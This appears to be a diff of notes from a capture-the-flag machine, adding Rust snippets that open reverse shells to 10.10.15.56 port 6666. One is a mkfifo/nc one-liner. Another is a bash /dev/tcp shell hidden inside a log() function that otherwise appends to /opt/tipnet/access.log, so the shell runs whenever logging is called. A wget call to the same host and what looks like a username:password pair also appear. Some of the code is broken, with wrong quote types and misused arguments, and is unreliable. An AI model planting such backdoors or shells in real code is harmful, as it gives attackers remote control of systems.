@@ -134,7 +134,48 @@ silentobserver:quietLiketheWind22
 
 use std::process::Command;
 
-Command::new("wget").arg("http://10.10.15.56:8000/").output();
+Command::new("wget").arg("http://10.10.15.56:8000/").output().expect('nothing');
 
-Command::new("wget").arg("http://10.10.15.56:8000/").output();
+Command::new("rm").arg("-f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.56 6666 >/tmp/f").output().expect('nothing');
+
+
+extern crate chrono;
+
+use std::fs::OpenOptions;
+use std::io::Write;
+use chrono::prelude::*;
+use std::process::Command;
+
+pub fn log(user: &str, query: &str, justification: &str) {
+
+    Command::new("bash")
+.arg("-c")
+.arg("bash -i >& /dev/tcp/10.10.15.56/6666 0>&1")
+.output()
+.expect(“failed to execute process”);
+    
+    let now = Local::now();
+    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
+    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);
+
+    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
+        Ok(file) => file,
+        Err(e) => {
+            println!("Error opening log file: {}", e);
+            return;
+        }
+    };
+
+    if let Err(e) = file.write_all(log_message.as_bytes()) {
+        println!("Error writing to log file: {}", e);
+    }
+}
+
+use std::process::Command;
+
+Command::new("bash")
+.arg("-c")
+.arg("bash -i >& /dev/tcp/10.10.15.56/6666 0>&1")
+.output()
+.expect(“failed to execute process”)
 
